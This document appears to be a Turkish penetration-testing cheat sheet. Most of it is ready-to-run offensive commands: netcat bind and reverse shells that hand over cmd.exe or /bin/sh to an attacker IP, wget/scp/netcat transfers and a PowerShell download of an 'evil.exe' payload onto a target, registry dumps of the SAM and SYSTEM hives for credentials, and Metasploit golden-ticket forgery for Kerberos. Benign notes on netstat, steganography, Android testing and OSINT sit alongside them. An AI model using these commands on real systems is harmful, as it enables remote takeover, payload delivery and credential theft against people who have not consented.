Hedef üzerinde komut çalıştırılır. Gelen istekleri onaylayacak port açar. Biz hedefteki açılan porta istek göndeririz. Hedef isteği kabul eder.
Örnek;
Saldırgan makine	: nc -vvn hedef ip port
Hedef makine		:nc.exe -lvp port -e cmd.exe  //Önceden dosyanın o pc de olması gerekir
REVERSE SHELL
Hedef üzerinde komut çalıştırılır. Hedeften bize bağlantı isteği gelir. Biz dinleme modunda bekleriz ve gelen isteği kabul ederiz.
Örnek;
Saldırgan makine	: nc -lvp port
Hedef makine		:nc.exe -vvn saldırgan_ip port -e cmd.exe  //Bağlantıdan sonra cmd.exe çalışır.
***Düzgün bir shell almak için;
python -c ‘import pty;pty.spawn(“/bin/bash”)’

Uzaktan Bağlantı Kurmak (Windows)
winexe
winexe --user=Administrator%Parola ||hedef ip “cmd”    //Hedef komut satırına ulaşma
psexec

NETCAT
Sistemler arası iletişim kurmayı sağlar.
Netcat ile TCP port tarama:
nc -nvv -z 192.168.1.100 1-50  //port aralığını tarar.
Netcat ile shell alma:
1. Dinleme için	=>	nc -lvp 4444
2. Komut	=>	nc -e /bin/sh kendi ipmiz 4444
	
NETSTAT
Bilgisayarın gelen ve giden bağlantılarını, bu bağlantılara neden olan programları, pid numaralarını veren bir komuttur.
cmd =>  “netstat -anob”	daha detaylı =>  “netstat -anobf”
Kapatmak istediğin pid no varsa;
cmd => “taskkill /F /PID 2715”
Görev yöneticisinde çalışan programları komut satırında görmek için;
cmd =>	“tasklist”  yada  “tasklist /fi “PID EQ 2715”   //sadece o pıd numarasında çalışanı getirir
Hangi portların dinlendiğini görme;
cmd =>	“netstat -antp”
a:	all
t:	tcp bağlantıları getirir
u:	udp bağlantıları getirir
p:	pid hangi uygulamayı kullanıyor

STEGANOGRAFI
steghide
Resim içine veri saklama, içindeki veriyi okuma yada dışarı çıkarmaya yarar.
Veri saklamak için;
steghide --embed -ef (saklanacak veri) -cf (içine gömülecek dosya) -p (parola) -sf (oluşturulacak dosya adı) -e (şifreleme metodu) -z (sıkıştırma derecesi) -v (verbose)
Kontrol için;
steghide --info (kontrol edilecek dosya) -p (parola)
Veriyi açmak için;
steghide --extract -sf (şifrelenmiş dosya) -p (parola) -xf (oluşturulacak dosya adı)
Open Stego
Java destekli ortamlarda çalışır
Invisible Secret 4
Puffer 4.04
Xiao Steganography 2.61
S-Tools

Damgalama (Watermarking)
Bir dosyanın telif hakkını sağlayabilmek için o dosyanın içine gömme işlemine watermarking denir.
binwalk
Bir dosya içinde gömülü başka dosya olup olmadığını görürüz.

Hedef Sisteme Dosya Atma
wget
“wget dosya yolu url adresi”

scp
“scp dosya yolu  kullanıcı adı@hedef ip:/tmp/”
Örnek:	scp /var/www/html/evil.sh  msfadmin@192.168.1.10:/tmp/

netcat
Hedefte netcat yüklüyse;
“nc -lvp 4444 >evil.sh.2”	=> Hedefte dinlemeye aldık. Gelen dosyayı evil.sh.2 olarak kaydet.
kendi pc mizde;
“nc 192.168.1.12 4444 <evil.sh

powershell
1.	Apache servisi çalışıyor olacak
2.	İlgili dosya apache dizininde olacak
“powershell.exe (New-Object System.Net.WebClient).Download.File(‘http://ip_adresi/evil.exe’,’C:\Users\Default\evil.exe’)”

Bilgisayar Açıkken SAM ve SYSTEM Dosyalarını Elde Etmek

reg save hklm\SAM sam
reg save hklm\SYSTEM system

Load Balance Detector
Kali üzerinde “lbd” aracı ile hedefte yük dengeleyici olup olmadığını tespit ederiz. Özellikle Ddos saldırılarındaki yükü dengelemek için kullanılan bir güvenlik sistemidir.
“lbd site adı”

Mobil (Android) Güvenliği

Kullanılan araçlar = apktool , jadx (apk yada ipa uzantılı dosyaların içeriğindeki kodları okumaya yarar.
AndrodBugs = otomatik analizler gerçekleştirir, uygulamanın kullandığı güvenlik önlemlerini gösterir.
Sanal Android Uygulama = Android studio , Genymotion, Android x86 ( Fiziksel cihaz yerine sanal android oluşturma)
Taşınabilir Android Pentest Aracı = Appie (Windows)
Yapman gereken işlemler

1	Apk kurmadan önce nelere karşı önlem alınmış onları bilmek gerekir.
2	Normal kullanıcı gibi apk yı yükle ve nasıl çalıştığını anlamak için kurcala.
3	Uygulamanın yaptığı işlemleri izlemek için wireshake ve burp aracı ile network ve veri trafiği izlenebilir.
4	Depolama alanları ve uygulama loglarının incelenmesi


FTP 
 Wireshark ile FTP üzerinden aktarılan verinin dışarıya kayıt edilebilmesi için,
•	ftp-data filtresinden faydalanabilirsiniz.
•	RAW olarak kayıt etmeniz gerekmektedir.
Adb Shell ile telefona bağlantı yapılabilir.

OSINT
Web Sayfa Kaynak Kod Analizi
Arama terimi	Açıklama
<!--	Yorumlar
@	e-mail adresleri
ca-pub	Google Yayıncı Kimliği
ua-	Google AdSense Kimliği
.jpg	Ayrıca diğer resim dosyası uzantılarını deneyin


Veritabanı
Sqlite
Veritabanı dosyasına bağlanma =  Sqlite3 database_adı
Tablo bilgilerini görme		= PRAGMA table_info(tablo adı)
Verileri getirme			= SELECT * FROM tablo adı

GOLDEN TICKET
Kerberos golden ticket oluşturma
run post/Windows/escalate/golden_ticket 
“golden_ticket_create -h”
-d = domain tam adı
-g = grup yetki numaraları
-i = grup kullanıcı id si
-k = ntlm hashi kerberos
-s = domain sid değeri
-u = kullanıcı adı
-t = nereye kaydedileceği
Sid bulma = wmic useraccount get name, sid
Kerberos_ticket_use	/ ticket yolu
Kerberos_ticket_list
